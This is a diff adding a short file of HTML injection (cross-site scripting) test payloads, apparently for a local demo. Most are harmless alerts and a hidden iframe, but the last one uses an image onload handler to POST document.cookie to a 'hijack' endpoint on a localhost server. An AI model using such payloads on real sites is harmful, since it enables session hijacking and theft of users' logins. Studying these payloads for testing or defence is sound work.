@@ -1,0 +1,15 @@
+// injecting an image
+This injects an image! <img src="https://i.pinimg.com/736x/49/ec/ae/49ecae18dbd2ec76b2279728d0cbd7ae.jpg"/>
+
+// on clickable alert
+<div onclick="alert('DONT CLICK RANDOM THINGS!')">This shows on clickable injection</div>
+
+// hiddne iframe func on load
+This shows hidden iframe injection <iframe onload="alert('hidden alert on load')" style="display:none"></iframe>
+
+// injection while stealing cookie using other server
+<img src="http://localhost:5070/api/photo" onload="
+        const http = new XMLHttpRequest();
+        const url = 'http://localhost:5070/api/hijack/' + document.cookie;
+        http.open('POST', url, true);
+        http.send();"/>
